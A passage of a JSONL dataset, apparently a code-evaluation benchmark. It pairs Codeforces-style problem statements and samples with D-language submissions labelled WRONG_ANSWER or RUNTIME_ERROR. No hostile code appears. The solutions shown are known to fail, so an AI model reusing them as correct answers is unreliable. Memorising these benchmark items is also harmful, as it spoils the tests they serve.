output","input_spec":"The first line contains two integers n,k (1\u2264n,k\u226450).\n","output_spec":"Print a single integer \u2014 the answer to the problem modulo 1000000007\u00a0(10^9+7).\n","notes":"If you aren't familiar with matchings, please, read the following link: http:\/\/en.wikipedia.org\/wiki\/Matching_(graph_theory).\n","sample_inputs":["1 1\n","2 1\n","3 1\n","4 2\n"],"sample_outputs":["0\n","1\n","3\n","12\n"]}
{"difficulty":2700,"lang":"D","lang_cluster":"d","src_uid":"407_D","submission_id":"6195743","tags":["dp","hashing"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.range, std.stdio, std.algorithm, std.bigint, std.conv;\n\nimmutable MN = 410;\nimmutable MA = 160010;\n\nvoid main () {\n\tint n, m;\n\tint[MN][] d = new int[MN][](MN);\n\tint[MA][] minp = new int[MA][](MN);\n\tforeach (ref a; minp) {\n\t\ta[] = MN;\n\t}\n\treadf(\"%d %d\\n\", &n, &m);\n\tforeach (i; 0..n) {\n\t\tstring[] s = split(readln());\n\t\tforeach (j; 0..m) {\n\t\t\tauto k = to!int(s[j]);\n\t\t\tminp[j][k] = min(minp[j][k], i);\n\t\t\td[i][j] = k;\n\t\t}\n\t}\t\n\tlong ans = 0;\n\tint[MN][] u = new int[MN][](MN);\n\tint[MN] y;\n\tforeach (i; 0..n) {\n\t\ty[] = 0;\n\t\tforeach (r; 0..m) {\n\t\t\tint p = minp[r][d[i][r]];\n\t\t\tif (p < i) {\n\t\t\t\ty[r] = u[r][r] = p+1;\n\t\t\t}\n\t\t\tans = max(ans, (i-u[r][r]+1));\n\t\t\tforeach_reverse (l; 0..r) {\n\t\t\t\tint pl = minp[l][d[i][r]];\n\t\t\t\tif (pl <= i) {\n\t\t\t\t\ty[l] = max(y[l], pl+1);\n\t\t\t\t}\n\t\t\t\tint pr = minp[r][d[i][l]];\n\t\t\t\tif (pr <= i) {\n\t\t\t\t\tu[l][r] = pr+1;\n\t\t\t\t}\n\t\t\t\tu[l][r] = max(u[l][r], u[l][r-1], u[l+1][r], y[l]);\n\t\t\t\tans = max(ans, (i-u[l][r]+1)*(r-l+1));\n\t\t\t}\n\t\t}\n\t}\n\twriteln(ans);\n}","description":"You are given matrix a of size n\u00d7m, its elements are integers. We will assume that the rows of the matrix are numbered from top to bottom from 1 to n, the columns are numbered from left to right from 1 to m. We will denote the element on the intersecting of the i-th row and the j-th column as aij.We'll call submatrix i1,j1,i2,j2 (1\u2264i1\u2264i2\u2264n;\u00a01\u2264j1\u2264j2\u2264m) such elements aij of the given matrix that i1\u2264i\u2264i2 AND j1\u2264j\u2264j2. We'll call the area of the submatrix number (i2-i1+1)\u00b7(j2-j1+1). We'll call a submatrix inhomogeneous, if all its elements are distinct.Find the largest (in area) inhomogenous submatrix of the given matrix.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n, m (1\u2264n,m\u2264400)\u00a0\u2014 the number of rows and columns of the matrix, correspondingly.\nEach of the next n lines contains m integers aij (1\u2264aij\u2264160000)\u00a0\u2014 the elements of the matrix.\n","output_spec":"Print a single integer \u2014 the area of the optimal inhomogenous submatrix.\n","notes":null,"sample_inputs":["3 3\n1 3 1\n4 5 6\n2 6 1\n","3 4\n5 2 3 1\n3 3 5 3\n4 4 4 5\n","2 6\n1 2 3 4 5 6\n8 6 7 8 9 1\n"],"sample_outputs":["6\n","4\n","8\n"]}
{"difficulty":2500,"lang":"D","lang_cluster":"d","src_uid":"442_C","submission_id":"7373330","tags":["data+structures","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import core.thread;\nimport std.conv, std.stdio, std.string;\nimport std.algorithm, std.array, std.bigint, std.container, std.math, std.range, std.regex;\n\n\/\/\tInput\nclass EOFException : Throwable { this() { super(\"EOF\"); } }\nstring[] tokens;\nstring readToken() { for (; tokens.empty; ) { tokens = readln.split; if (stdin.eof) throw new EOFException; } auto token = tokens[0]; tokens.popFront; return token; }\nint readInt() { return to!int(readToken); }\nlong readLong() { return to!long(readToken); }\nreal readReal() { return to!real(readToken); }\n\n\/\/\tchmin\/chmax\nvoid chmin(T)(ref T t, in T f) { if (t > f) t = f; }\nvoid chmax(T)(ref T t, in T f) { if (t < f) t = f; }\n\n\/\/\tPair\nstruct Pair(S, T) {\n\tS x; T y;\n\tint opCmp(    const Pair p) const { return (x < p.x) ? -1 : (x > p.x) ? +1 : (y < p.y) ? -1 : (y > p.y) ? +1 : 0; }\n\tint opCmp(ref const Pair p) const { return (x < p.x) ? -1 : (x > p.x) ? +1 : (y < p.y) ? -1 : (y > p.y) ? +1 : 0; }\n\tstring toString() const { return \"(\" ~ to!string(x) ~ \", \" ~ to!string(y) ~ \")\"; }\n}\nauto pair(S, T)(inout(S) x, inout(T) y) { return Pair!(S, T)(x, y); }\n\n\/\/\tArray\nint binarySearch(T)(in T[] as, in bool delegate(T) test) { int low = -1, upp = as.length; for (; low + 1 < upp; ) { int mid = (low + upp) >> 1; (test(as[mid]) ? low : upp) = mid; } return upp; }\nint lowerBound(T)(in T[] as, in T val) { return as.binarySearch((T a) { return (a <  val); }); }\nint upperBound(T)(in T[] as, in T val) { return as.binarySearch((T a) { return (a <= val); }); }\nT[] unique(T)(in T[] as) { T[] bs; foreach (a; as) if (bs.empty || bs[$ - 1] != a) bs ~= a; return bs; }\n\n\nclass Node {\n\tNode l, r;\n\tlong val;\n\tthis(long val) {\n\t\tthis.val = val;\n\t}\n}\n\nint N;\nlong[] A;\n\nvoid main(string[] args) {\n\ttry {\n\tfor (; ; ) {\n\t\tN = readInt;\n\t\tA = new long[N];\n\t\tforeach (i; 0 .. N) {\n\t\t\tA[i] = readLong;\n\t\t}\n\t\t\n\t\tNode[] nodes = new Node[N];\n\t\tforeach (i; 0 .. N) {\n\t\t\tnodes[i] = new Node(A[i]);\n\t\t}\n\t\tforeach (i; 0 .. N) {\n\t\t\tif (0 <= i - 1) {\n\t\t\t\tnodes[i].l = nodes[i - 1];\n\t\t\t}\n\t\t\tif (i + 1 < N) {\n\t\t\t\tnodes[i].r = nodes[i + 1];\n\t\t\t}\n\t\t}\n\t\t\n\t\tnodes.sort!\"a.val < b.val\";\n\t\tlong ans;\n\t\tforeach (node; nodes[0 .. $ - 2]) {\ndebug{\nNode[]ls;for(Node a=node.l;a;a=a.l)ls~=a;\nforeach_reverse(a;ls)write(a.val,\" \");\nfor(Node a=node;a;a=a.r)write(a.val,\" \");\nwriteln;\n}\n\t\t\tif (node.l is null && node.r is null) {\n\t\t\t\t\/\/\n\t\t\t} else if (node.l is null) {\n\t\t\t\tans += node.val;\n\t\t\t\tnode.r.l = null;\n\t\t\t} else if (node.r is null) {\n\t\t\t\tans += node.val;\n\t\t\t\tnode.l.r = null;\n\t\t\t} else {\n\t\t\t\tans += min(node.l.val, node.r.val);\n\t\t\t\tnode.l.r = node.r;\n\t\t\t\tnode.r.l = node.l;\n\t\t\t}\n\t\t}\n\t\twriteln(ans);\n\t}\n\t} catch (EOFException) {}\n}\n\n","description":"Artem has an array of n positive integers. Artem decided to play with it. The game consists of n moves. Each move goes like this. Artem chooses some element of the array and removes it. For that, he gets min(a,b) points, where a and b are numbers that were adjacent with the removed number. If the number doesn't have an adjacent number to the left or right, Artem doesn't get any points. After the element is removed, the two parts of the array glue together resulting in the new array that Artem continues playing with. Borya wondered what maximum total number of points Artem can get as he plays this game.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2264n\u22645\u00b710^5) \u2014 the number of elements in the array. The next line contains n integers ai (1\u2264ai\u226410^6) \u2014 the values of the array elements.\n","output_spec":"In a single line print a single integer \u2014 the maximum number of points Artem can get.\n","notes":null,"sample_inputs":["5\n3 1 5 2 6\n","5\n1 2 3 4 5\n","5\n1 100 101 100 1\n"],"sample_outputs":["11\n","6\n","102\n"]}
{"difficulty":1800,"lang":"D","lang_cluster":"d","src_uid":"61_D","submission_id":"93294883","tags":["dfs+and+similar","graphs","greedy","shortest+paths","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/ Cheese-Cracker: cheese-cracker.github.io\nimport std.stdio, std.conv, std.functional, std.string, std.algorithm;\nimport std.container, std.range, std.typecons, std.numeric, std.math, std.random;\n\nalias ll = long;\nalias rbt = redBlackTree;\nalias tup = Tuple!(long, long);\nstatic string[] inp;\nT rd(T = long)(){while(!inp.length) inp = readln.chomp.split; string a = inp[0]; inp.popFront; return a.to!T;}\nT[] rdarr(T = long)(T fix = 0){ auto r = readln.chomp.split.to!(T[]); r[] += fix; return r; }\n\/*******************************It's a Me, Mario!*******************************************\/\n\ntup[][long] adj;\nbool[long] vis;\n\nlong dfs(ll u){\n    vis[u] = 1;\n    ll maxw = 0;\n    foreach(tup e; adj[u]){\n        if(!vis.get(e[0], 0)){\n            maxw = max(e[1] + dfs(e[0]), maxw);\n        }\n    }\n    return maxw;\n}\n\n\nvoid play(){\n    int n;\n    n = rd!int;\n    ll u, v, w;\n    ll sumwt = 0;\n    foreach(i; 0..n-1){\n        u = rd; v = rd; w = rd;\n        adj[u] ~= tup(v, w);\n        adj[v] ~= tup(u, w);\n        sumwt += w;\n    }\n    ll maxwtpath = dfs(1);\n    ll leftw = sumwt - maxwtpath;\n    debug writeln(\"D: \", sumwt, \" \", maxwtpath, \" \", leftw);\n    writeln(maxwtpath + 2*leftw);\n}\n\nint main(){\n    long t = 1;\n    \/* t = rd;        \/\/ Toggle! *\/\n    while(t--) play();  \/\/ Let's play!\n    stdout.flush;\n    return 0;\n}\n","description":"Valerian was captured by Shapur. The victory was such a great one that Shapur decided to carve a scene of Valerian's defeat on a mountain. So he had to find the best place to make his victory eternal!He decided to visit all n cities of Persia to find the best available mountain, but after the recent war he was too tired and didn't want to traverse a lot. So he wanted to visit each of these n cities at least once with smallest possible traverse. Persian cities are connected with bidirectional roads. You can go from any city to any other one using these roads and there is a unique path between each two cities.All cities are numbered 1 to n. Shapur is currently in the city 1 and he wants to visit all other cities with minimum possible traverse. He can finish his travels in any city.Help Shapur find how much He should travel.","input_from":"standard input","output_to":"standard output","input_spec":"First line contains a single natural number n (1\u2264n\u226410^5) \u2014 the amount of cities.\nNext n-1 lines contain 3 integer numbers each xi, yi and wi (1\u2264xi,yi\u2264n,0\u2264wi\u22642\u00d710^4). xi and yi are two ends of a road and wi is the length of that road.\n","output_spec":"A single integer number, the minimal length of Shapur's travel.\nPlease, do not use %lld specificator to read or write 64-bit integers in C++. It is preffered to use cout (also you may use %I64d).\n","notes":null,"sample_inputs":["3\n1 2 3\n2 3 4\n","3\n1 2 3\n1 3 3\n"],"sample_outputs":["7\n","9\n"]}
{"difficulty":1700,"lang":"D","lang_cluster":"d","src_uid":"66_D","submission_id":"145169306","tags":["constructive+algorithms","math","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"import core.bitop, std.bitmanip;\r\nimport core.checkedint;\r\nimport std.algorithm, std.functional, std.meta;\r\nimport std.array, std.container;\r\nimport std.bigint;\r\nimport std.conv;\r\nimport std.math, std.numeric;\r\nimport std.range, std.range.interfaces;\r\nimport std.stdio, std.string;\r\nimport std.ascii, std.typecons;\r\n\r\nvoid main()\r\n{\r\n    int n;\r\n    readf!\"%s\"(n);\r\n    readln;\r\n    \r\n    immutable int MAXP = 300;\r\n    \r\n    auto isPrime = new bool[MAXP];\r\n    isPrime[] = true;\r\n    int[] primes;\r\n    for (int i = 2; primes.length < n; ++i) {\r\n        if (!isPrime[i]) { continue; }\r\n        \r\n        primes ~= i;\r\n        for (int j = i+i; j < MAXP; j += i) { isPrime[j] = false; }\r\n    }\r\n    \r\n    BigInt product = 1;\r\n    foreach (e; primes) { product *= e; }\r\n    \r\n    debug { product.writeln; }\r\n    \r\n    BigInt[] ans;\r\n    foreach (i; 0 .. n) {\r\n        ans ~= product \/ primes[i];\r\n    }\r\n    \r\n    ans.each!writeln;\r\n}","description":"Little Petya has a birthday soon. Due this wonderful event, Petya's friends decided to give him sweets. The total number of Petya's friends equals to n.Let us remind you the definition of the greatest common divisor: GCD(a1,...,ak)=d, where d represents such a maximal positive number that each ai (1\u2264i\u2264k) is evenly divisible by d. At that, we assume that all ai's are greater than zero.Knowing that Petya is keen on programming, his friends has agreed beforehand that the 1-st friend gives a1 sweets, the 2-nd one gives a2 sweets, ..., the n-th one gives an sweets. At the same time, for any i and j (1\u2264i,j\u2264n) they want the GCD(ai,aj) not to be equal to 1. However, they also want the following condition to be satisfied: GCD(a1,a2,...,an)=1. One more: all the ai should be distinct.Help the friends to choose the suitable numbers a1,...,an.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2264n\u226450).\n","output_spec":"If there is no answer, print \"-1\" without quotes. Otherwise print a set of n distinct positive numbers a1,a2,...,an. Each line must contain one number. Each number must consist of not more than 100 digits, and must not contain any leading zeros. If there are several solutions to that problem, print any of them.\nDo not forget, please, that all of the following conditions must be true:\n For every i and j (1\u2264i,j\u2264n): GCD(ai,aj)\u22601 GCD(a1,a2,...,an)=1 For every i and j (1\u2264i,j\u2264n,i\u2260j): ai\u2260aj Please, do not use %lld specificator to read or write 64-bit integers in C++. It is preffered to use cout (also you may use %I64d).\n","notes":null,"sample_inputs":["3\n","4\n"],"sample_outputs":["99\n55\n11115\n","385\n360\n792\n8360\n"]}
{"difficulty":2600,"lang":"D","lang_cluster":"d","src_uid":"698_D","submission_id":"19258358","tags":["brute+force","geometry","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.algorithm, std.array, std.range, std.stdio, std.typecons;\r\nalias Point = Tuple !(int, q{x}, int, q{y});\r\nlong sp (Point a, Point b, Point c) {return (b.x - a.x) * 1L * (c.x - a.x) + (b.y - a.y) * 1L * (c.y - a.y);}\r\nlong vp (Point a, Point b, Point c) {return (b.x - a.x) * 1L * (c.y - a.y) - (b.y - a.y) * 1L * (c.x - a.x);}\r\nvoid main () {\r\n\tint k, n, res;\r\n\treadf (\" %s %s\", &k, &n);\r\n\tauto a = new Point [k], b = new Point [n], s = new int [] [] [] (k, n);\r\n\tforeach (ref p; a) readf (\" %s %s\", &p.x, &p.y);\r\n\tforeach (ref q; b) readf (\" %s %s\", &q.x, &q.y);\r\n\tforeach (p; 0..k) foreach (q; 0..n) s[p][q] = n.iota.filter !(r => vp (b[r], a[p], b[q]) == 0 && sp (b[r], a[p], b[q]) < 0).take (k).array;\r\n\tbool go (int mask, int depth, int [] t) {\r\n\t\tif (t.empty) return true;\r\n\t\tif (depth < t.length) return false;\r\n\t\tforeach (p; 0..k) if (mask & (1 << p)) foreach (i, q; t) {\r\n\t\t\tauto next = t[0..i] ~ t[i + 1..$] ~ s[p][q];\r\n\t\t\tif (go (mask ^ (1 << p), depth - 1, next.sort ().uniq.array)) return true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\tforeach (q; 0..n) res += k.iota.any !(p => go (-1, k, [p]));\r\n\twriteln (res);\r\n}\r\n","description":"Bearland is a dangerous place. Limak can\u2019t travel on foot. Instead, he has k magic teleportation stones. Each stone can be used at most once. The i-th stone allows to teleport to a point (axi,ayi). Limak can use stones in any order.There are n monsters in Bearland. The i-th of them stands at (mxi,myi).The given k+n points are pairwise distinct.After each teleportation, Limak can shoot an arrow in some direction. An arrow will hit the first monster in the chosen direction. Then, both an arrow and a monster disappear. It\u2019s dangerous to stay in one place for long, so Limak can shoot only one arrow from one place.A monster should be afraid if it\u2019s possible that Limak will hit it. How many monsters should be afraid of Limak?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers k and n (1\u2264k\u22647, 1\u2264n\u22641000)\u00a0\u2014 the number of stones and the number of monsters.\nThe i-th of following k lines contains two integers axi and ayi (-10^9\u2264axi,ayi\u226410^9)\u00a0\u2014 coordinates to which Limak can teleport using the i-th stone.\nThe i-th of last n lines contains two integers mxi and myi (-10^9\u2264mxi,myi\u226410^9)\u00a0\u2014 coordinates of the i-th monster.\nThe given k+n points are pairwise distinct.\n","output_spec":"Print the number of monsters which should be afraid of Limak.\n","notes":"In the first sample, there are two stones and four monsters. Stones allow to teleport to points (-2,-1) and (4,5), marked blue in the drawing below. Monsters are at (4,2), (2,1), (4,-1) and (1,-1), marked red. A monster at (4,-1) shouldn't be afraid because it's impossible that Limak will hit it with an arrow. Other three monsters can be hit and thus the answer is 3.\n \nIn the second sample, five monsters should be afraid. Safe monsters are those at (300,600), (170,340) and (90,180).\n","sample_inputs":["2 4\n-2 -1\n4 5\n4 2\n2 1\n4 -1\n1 -1\n","3 8\n10 20\n0 0\n20 40\n300 600\n30 60\n170 340\n50 100\n28 56\n90 180\n-4 -8\n-1 -2\n"],"sample_outputs":["3\n","5\n"]}
{"difficulty":2300,"lang":"D","lang_cluster":"d","src_uid":"774_E","submission_id":"35896427","tags":["*special","math","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.stdio, std.bigint, std.string;\r\n\r\nvoid main() {\r\n    auto a_ = readln.strip;\r\n    auto n = a_.length;\r\n    auto a = BigInt(a_);\r\n    \/\/ auto b = BigInt(readln.strip);\r\n    int b;\r\n    scanf(\"%d\", &b);\r\n    if (n > 100) {\r\n        writeln(b);\r\n        writeln(a);\r\n    }\r\n    auto ans = a % b;\r\n    auto pow10n = 1; for (int i=0; i<n; i++) pow10n = (pow10n * 10) % b;\r\n    auto left=0;\r\n    auto apow10i = int((a*10)%b);\r\n    for (int i=1; i<n; i++) {\r\n        left = (left * 10 + (a_[i-1]-'0')) % b;\r\n        auto _a = (b + (apow10i + left - left * pow10n) % b) % b;\r\n        apow10i = (apow10i * 10) % b;\r\n\r\n        if (a_[i] != '0') {\r\n            \/\/ writeln(left, ' ', _a, ' ', _a % b);\r\n            if (_a % b < ans)\r\n                ans = _a % b;\r\n        }\r\n    }\r\n    writeln(ans);\r\n}\r\n","description":"Stepan has a very big positive integer.Let's consider all cyclic shifts of Stepan's integer (if we look at his integer like at a string) which are also integers (i.e. they do not have leading zeros). Let's call such shifts as good shifts. For example, for the integer 10203 the good shifts are the integer itself 10203 and integers 20310 and 31020.Stepan wants to know the minimum remainder of the division by the given number m among all good shifts. Your task is to determine the minimum remainder of the division by m.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the integer which Stepan has. The length of Stepan's integer is between 2 and 200000 digits, inclusive. It is guaranteed that Stepan's integer does not contain leading zeros.\nThe second line contains the integer m (2\u2264m\u226410^8) \u2014 the number by which Stepan divides good shifts of his integer.\n","output_spec":"Print the minimum remainder which Stepan can get if he divides all good shifts of his integer by the given number m.\n","notes":"In the first example all good shifts of the integer 521 (good shifts are equal to 521, 215 and 152) has same remainder 2 when dividing by 3.\nIn the second example there are only two good shifts: the Stepan's integer itself and the shift by one position to the right. The integer itself is 1001 and the remainder after dividing it by 5 equals 1. The shift by one position to the right equals to 1100 and the remainder after dividing it by 5 equals 0, which is the minimum possible remainder.\n","sample_inputs":["521\n3\n","1001\n5\n","5678901234567890123456789\n10000\n"],"sample_outputs":["2\n","0\n","123\n"]}
{"difficulty":2300,"lang":"D","lang_cluster":"d","src_uid":"788_C","submission_id":"25919795","tags":["dfs+and+similar","graphs","shortest+paths"],"exec_outcome":"RUNTIME_ERROR","source_code":"import core.bitop;\r\nimport std.algorithm;\r\nimport std.array;\r\nimport std.bitmanip;\r\nimport std.container;\r\nimport std.conv;\r\nimport std.exception;\r\nimport std.functional;\r\nimport std.math;\r\nimport std.numeric;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.string;\r\nimport std.typecons;\r\n\r\nimmutable int half = 1 << 10;\r\nimmutable int limit = half << 1;\r\n\r\nvoid main ()\r\n{\r\n\tint n;\r\n\tint k;\r\n\twhile (readf (\" %s %s\", &n, &k) > 0)\r\n\t{\r\n\t\tauto b = new bool [half];\r\n\t\treadln;\r\n\t\tforeach (c; readln.splitter.map !(to !(int)))\r\n\t\t{\r\n\t\t\tb[c] = true;\r\n\t\t}\r\n\r\n\t\tauto f = new uint [] [] (2, limit \/ 32);\r\n\t\tint d = 0;\r\n\t\tf[d][] = 0;\r\n\t\tf[d][half >> 5] |= 1U << (half & 31);\r\n\t\tforeach (res; 1..half + 1)\r\n\t\t{\r\n\t\t\td ^= 1;\r\n\t\t\tf[d][] = 0;\r\n\t\t\tforeach (c; 0..half)\r\n\t\t\t{\r\n\t\t\t\tif (!b[c])\r\n\t\t\t\t{\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\tint s = c - n;\r\n\t\t\t\tint sLo = s & 31;\r\n\t\t\t\tint sHi = s >> 5;\r\n\t\t\t\tint sBack = 32 - sLo;\r\n\t\t\t\tuint loMask = (1U << sLo) - 1U;\r\n\t\t\t\tuint hiMask = ~loMask;\r\n\t\t\t\tint j = sHi;\r\n\t\t\t\tforeach (i; 0..limit \/ 32)\r\n\t\t\t\t{\r\n\/\/\t\t\t\t\tf[d][i + s] |= f[!d][i];\r\n\t\t\t\t\tif (j >= 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tf[d][j] |= f[!d][i] << sLo;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tj += 1;\r\n\t\t\t\t\tif (j >= limit \/ 32)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif (j >= 0 && sLo != 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tf[d][j] |= f[!d][i] >> sBack;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tif (f[d][half >> 5] & (1U << (half & 31)))\r\n\t\t\t{\r\n\t\t\t\twriteln (res);\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n","description":"Sasha and Kolya decided to get drunk with Coke, again. This time they have k types of Coke. i-th type is characterised by its carbon dioxide concentration . Today, on the party in honour of Sergiy of Vancouver they decided to prepare a glass of Coke with carbon dioxide concentration . The drink should also be tasty, so the glass can contain only integer number of liters of each Coke type (some types can be not presented in the glass). Also, they want to minimize the total volume of Coke in the glass.Carbon dioxide concentration is defined as the volume of carbone dioxide in the Coke divided by the total volume of Coke. When you mix two Cokes, the volume of carbon dioxide sums up, and the total volume of Coke sums up as well.Help them, find the minimal natural number of liters needed to create a glass with carbon dioxide concentration . Assume that the friends have unlimited amount of each Coke type.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n, k (0\u2264n\u22641000, 1\u2264k\u226410^6)\u00a0\u2014 carbon dioxide concentration the friends want and the number of Coke types.\nThe second line contains k integers a1,a2,...,ak (0\u2264ai\u22641000)\u00a0\u2014 carbon dioxide concentration of each type of Coke. Some Coke types can have same concentration.\n","output_spec":"Print the minimal natural number of liter needed to prepare a glass with carbon dioxide concentration , or -1 if it is impossible.\n","notes":"In the first sample case, we can achieve concentration  using one liter of Coke of types  and : .\nIn the second case, we can achieve concentration  using two liters of  type and one liter of  type: .\n","sample_inputs":["400 4\n100 300 450 500\n","50 2\n100 25\n"],"sample_outputs":["2\n","3\n"]}
{"difficulty":2700,"lang":"D","lang_cluster":"d","src_uid":"868_E","submission_id":"84163023","tags":["dp","graphs","trees"],"exec_outcome":"WRONG_ANSWER","source_code":"import std.conv, std.functional, std.range, std.stdio, std.string;\nimport std.algorithm, std.array, std.bigint, std.bitmanip, std.complex, std.container, std.math, std.mathspecial, std.numeric, std.regex, std.typecons;\nimport core.bitop;\n\nclass EOFException : Throwable { this() { super(\"EOF\"); } }\nstring[] tokens;\nstring readToken() { for (; tokens.empty; ) { if (stdin.eof) { throw new EOFException; } tokens = readln.split; } auto token = tokens.front; tokens.popFront; return token; }\nint readInt() { return readToken.to!int; }\nlong readLong() { return readToken.to!long; }\nreal readReal() { return readToken.to!real; }\n\nbool chmin(T)(ref T t, in T f) { if (t > f) { t = f; return true; } else { return false; } }\nbool chmax(T)(ref T t, in T f) { if (t < f) { t = f; return true; } else { return false; } }\n\nint binarySearch(alias pred, T)(in T[] as) { int lo = -1, hi = cast(int)(as.length); for (; lo + 1 < hi; ) { const mid = (lo + hi) >> 1; (unaryFun!pred(as[mid]) ? hi : lo) = mid; } return hi; }\nint lowerBound(T)(in T[] as, T val) { return as.binarySearch!(a => (a >= val)); }\nint upperBound(T)(in T[] as, T val) { return as.binarySearch!(a => (a > val)); }\n\n\nenum INF = 10L^^18;\n\nint N;\nint[] U, V;\nlong[] W;\nint S;\nint M;\nint[] X;\n\nint[][] G;\n\nlong[][][][] cache;\n\n\/\/ arriving at u from p via ip, a above, b below\nlong calc(int u, int p, int ip, int a, int b) {\n  assert(b > 0);\n  auto ret = &cache[u][p][a][b];\n  if (*ret == -1) {\n    debug {\n      writeln(\"calc \", u, \" \", p, \" \", ip, \" \", a, \" \", b);\n    }\n    if (G[u].length == 1) {\n      \/\/ leaf\n      if (a == 0) {\n        *ret = 0;\n      } else {\n        *ret = W[G[u][0]] + calc(p, u, ip, 0, a);\n      }\n    } else {\n      assert(b > 0);\n      \/\/ c_j for j-th child\n      \/\/ maximize min { W[i] + calc(u, v_j, i_j, a + b - c_j, c_j) | c_j > 0 }\n      auto crt = new long[b + 1];\n      crt[] = -INF;\n      crt[0] = INF;\n      foreach (i; G[u]) {\n        const v = U[i] ^ V[i] ^ u;\n        if (v != p) {\n          auto nxt = crt.dup;\n          foreach (c; 0 .. b + 1) {\n            if (crt[c] >= -INF) {\n              foreach (d; 0 .. b - c + 1) {\n                if (nxt[c + d] < crt[c]) {\n                  chmax(nxt[c + d], min(crt[c], W[i] + calc(v, u, i, a + b - d, d)));\n                }\n              }\n            }\n          }\n          crt = nxt;\n        }\n      }\n      *ret = crt[b];\n    }\n    debug {\n      writeln(u, \" \", p, \" \", ip, \" \", a, \" \", b, \": \", *ret);\n    }\n  }\n  return *ret;\n}\n\nvoid main() {\n  try {\n    for (; ; ) {\n      N = readInt();\n      U = new int[N - 1];\n      V = new int[N - 1];\n      W = new long[N - 1];\n      foreach (i; 0 .. N - 1) {\n        U[i] = readInt() - 1;\n        V[i] = readInt() - 1;\n        W[i] = readLong();\n      }\n      S = readInt() - 1;\n      M = readInt();\n      X = new int[M];\n      foreach (m; 0 .. M) {\n        X[m] = readInt() - 1;\n      }\n      \n      G = new int[][N];\n      foreach (i; 0 .. N - 1) {\n        G[U[i]] ~= i;\n        G[V[i]] ~= i;\n      }\n      \n      cache = new long[][][][](N, N, M + 1, M + 1);\n      foreach (u; 0 .. N) foreach (p; 0 .. N) {\n        foreach (a; 0 .. M + 1) foreach (b; 0 .. M + 1) {\n          cache[u][p][a][b] = -1;\n        }\n      }\n      \n      auto d = new int[][](N, N);\n      foreach (u; 0 .. N) {\n        d[u][] = N;\n        d[u][u] = 0;\n      }\n      foreach (i; 0 .. M - 1) {\n        d[U[i]][V[i]] = d[V[i]][U[i]] = 1;\n      }\n      foreach (w; 0 .. N) foreach (u; 0 .. N) foreach (v; 0 .. N) {\n        chmin(d[u][v], d[u][w] + d[w][v]);\n      }\n      auto nums = new int[N];\n      foreach (x; X) {\n        foreach (i; G[S]) {\n          const v = U[i] ^ V[i] ^ S;\n          if (d[S][x] == 1 + d[v][x]) {\n            ++nums[v];\n          }\n        }\n      }\n      debug {\n        writeln(\"nums = \", nums);\n      }\n      \n      long ans = INF;\n      foreach (i; G[S]) {\n        const v = U[i] ^ V[i] ^ S;\n        if (nums[v] > 0) {\n          chmin(ans, W[i] + calc(v, S, i, M - nums[v], nums[v]));\n        }\n      }\n      writeln(ans);\n    }\n  } catch (EOFException e) {\n  }\n}\n","description":"You are given a tree (a connected non-oriented graph without cycles) with vertices numbered from 1 to n, and the length of the i-th edge is wi. In the vertex s there is a policeman, in the vertices x1,x2,...,xm (xj\u2260s) m criminals are located.The policeman can walk along the edges with speed 1, the criminals can move with arbitrary large speed. If a criminal at some moment is at the same point as the policeman, he instantly gets caught by the policeman. Determine the time needed for the policeman to catch all criminals, assuming everybody behaves optimally (i.e. the criminals maximize that time, the policeman minimizes that time). Everybody knows positions of everybody else at any moment of time.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains single integer n (1\u2264n\u226450)\u00a0\u2014 the number of vertices in the tree. The next n-1 lines contain three integers each: ui, vi, wi (1\u2264ui,vi\u2264n, 1\u2264wi\u226450) denoting edges and their lengths. It is guaranteed that the given graph is a tree.\nThe next line contains single integer s (1\u2264s\u2264n)\u00a0\u2014 the number of vertex where the policeman starts.\nThe next line contains single integer m (1\u2264m\u226450)\u00a0\u2014 the number of criminals. The next line contains m integers x1,x2,...,xm (1\u2264xj\u2264n, xj\u2260s)\u00a0\u2014 the number of vertices where the criminals are located. xj are not necessarily distinct.\n","output_spec":"If the policeman can't catch criminals, print single line \"Terrorists win\" (without quotes).\nOtherwise, print single integer\u00a0\u2014 the time needed to catch all criminals.\n","notes":"In the first example one of the optimal scenarios is the following. The criminal number 2 moves to vertex 3, the criminal 4\u00a0\u2014 to vertex 4. The policeman goes to vertex 4 and catches two criminals. After that the criminal number 1 moves to the vertex 2. The policeman goes to vertex 3 and catches criminal 2, then goes to the vertex 2 and catches the remaining criminal.\n","sample_inputs":["4\n1 2 2\n1 3 1\n1 4 1\n2\n4\n3 1 4 1\n","6\n1 2 3\n2 3 5\n3 4 1\n3 5 4\n2 6 3\n2\n3\n1 3 5\n"],"sample_outputs":["8\n","21\n"]}
